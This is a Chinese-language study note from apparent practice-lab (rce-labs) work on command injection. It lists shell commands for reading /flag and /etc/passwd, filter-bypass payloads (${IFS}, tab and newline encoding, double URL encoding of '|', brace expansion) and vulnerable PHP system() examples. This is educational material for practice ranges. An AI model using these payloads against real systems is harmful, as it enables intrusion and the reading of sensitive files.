# RCE 远程代码执行
## Apursuit/rce-labs
用 [Apursuit/rce-labs](https://github.com/Apursuit/rce-labs) 靶场学习。  

cat, tac, head, tail, more, less, nl, sort(排序), uniq(去重), strings 直接用。  

### dd
``` bash
dd if=/flag 
```
即可读写 /flag 字符串默认输出到标准输出。也可以更丰富：  
```
dd if=/flag 2>/dev/null
dd if=/flag of=/dev/stdout
```

### rev
反序输出，加个管道回去就正向了。  
```
rev /flag | rev
```

### od
od 默认输出是八进制。可以用 `-c` 显示字符内容：  
```bash
od -c /flag
```

更精简：  
```
od -An -c /flag
```

### xxd
xxd 用于转储十六进制。  

用管道做两次转换即可：  

```
xxd -p /flag | xxd -r -p
```

### hexdump
hexdump 用十六进制转储文件。  

这样就能显示字符串：  
```
hexdump -C /flag
```

复杂点可以：  
``` bash
hexdump -v -e '/1 "%c"' /flag
hexdump -e '16/1 "%_p"' /flag    # 不可打印字符显示为 .
```

### base32/base64
祖传管道编解码。  
```
base32 /flag | base32 -d
base64 /flag | base64 -d

```

### grep
搜索特定模式，拿来输出所有行：  
```
grep '' /flag
grep . /flag
grep -v '^$' /flag
```


### file
显示文件类型，可以触发报错读取。  
这道题 deepseek 和 gpt luna 都说不行，最后还是我找的博客。……  
-f 报错出具体内容。  

```
file -f /flag
```

### date
直接读文件，把 stderr 定向到 stdout 即可。  
```
date -f /flag 2>&1
```

### diff
一键获取两个文件信息(x
```
diff /flag /etc/passwd
```

### find
找文件而已，要求的 payload 找到 findme.txt:  
```
find / -name 'findme.txt'
```

### ping
可以用 ping 测试出网外带数据，在无回显场景下窃取 flag。  


### awk
```
awk '{print}' /flag
```

### curl
```
curl file:///flag
```

### echo
通过输出重定向写入文件

### sed

### shell 特性绕过滤

## 黑名单绕过与编码
### base64
当后端出现：  
``` php
$cmd = base64_decode($_GET['cmd']);
system($cmd);
```

时，传入 base64 编码才可以得到，对应的命令。  

### URL 编码与双重解码
PHP/Web 服务器解析查询参数时通常会做一次 URL 解码。所以： $cmd=%7C URL 解码后就是 `|`。  
如果有： 
```
echo $_GET['cmd'];
```

输出为 `|`。  

`%257C` 得到 `%7c` 因为 `%25` 是 % 的解码。  

如果有：  
``` php
echo urldecode($_GET['cmd']);
```

`%257c` 和 `%7c` 结果相同为 `|`。  

这就是双重编码。  

注意这里的 `%` 应该是 ASCII 半角，而不是全角。  

所以有：  
```
%7c 解码一次 |
%257c 解码一次 %7c 再解码一次 |
```

``` php
<?php

echo "QUERY_STRING: ";

var_dump($_SERVER['QUERY_STRING']);
echo "<br>";

echo "_GET cmd: ";
var_dump($_GET['cmd'] ?? null);
echo "<br>";

echo "urldecode cmd: ";
var_dump(urldecode($_GET['cmd'] ?? ''));
echo "<br>";
```

查看 `%7c` 和 `%257c` 的区别。  

```php
<?php

$cmd = $_GET['cmd'] ?? '';

var_dump($cmd);
if (str_contains($cmd, '|')){
    die("blocked");
}

$cmd = urldecode($cmd);

echo "<br>";
var_dump($cmd);
```

如果直接 `%7c` 直接被 `die()` 拦截，如果是 `%257c` 就可以解析出 `|`。  

## 参数解析差异

## shell 参数分词与危险 sink
- 过滤器：决定输入是否被拦截  
- sink：用户可控数据最终到达的危险执行点  

php 里常见的 shell sink:  
- system($cmd)
- exec($cmd)
- shell_exec($cmd)
- \`$cmd\` 反引号执行
- popen($cmd, $mod)
- proc_open($cmd, ...)

只要把未处理的用户输入拼进命令字符串，就有危险。  

shell 会对整条字符串重新分词和解释。  

## 无空格拼命令
如果过滤了空格，可以用 `${IFS}` 代替：`cat${IFS}/etc/passwd`。  
命令替换则用反引号或 `$()`，比如 `echo $(id)` 程序会先执行 `id`，再把结果塞回原命令。  
> `${IFS}` 不一定在所有过滤器中生效，引号、括号可能也被拦。  

``` php
<?php

$cmd = $_GET['x'];
$blacklist = [' ', 'cat', '/', ';', '|', '&'];

foreach ($blacklist as $bad) {
    if (strpos($cmd, $bad) !== false) {
        die("blocked: " . $bad);
    }
}

system("echo " . $cmd);
```

- `${IFS}` 变量展开成空格 `cat${IFS}/etc/passwd`
- `$IFS$9` 防止粘连`cat$IFS$9/etc/passwd`
- 制表符 `%09` 制表符也是 IFS`cat%09/etc/passwd`
- 换行 `%0a` 换行也是 IFS`cat%0a/etc/passwd`
- 输入重定向 `<` 重定向符号天然分隔`cat</etc/passwd`
- 花括号扩展`{cat,/etc/passwd}`

这些方法是否生效，取决于后端过滤的是空格字符，还是任何空白字符，还是特定正则。  

## 选项注入
命令注入不只来自 shell 符号，也可能来自选项注入。  
``` php
system('grep ' . escapeshellarg($keyword) . ' notes.txt');
```

这里加入 `-n` 参数可以显式的显式匹配行号内容，比如：  
```
1:<?php
❯ grep -n 'php' main.php
```

- **信息泄露**:  `grep -n` 改变输出格式，`tar -v` 输出更多信息。  
- **任意文件读取/写入**: `curl -o /tmp/xx` 让用户控制输出文件，`wget -O-` 输出到标准输出。  
- **代码执行**

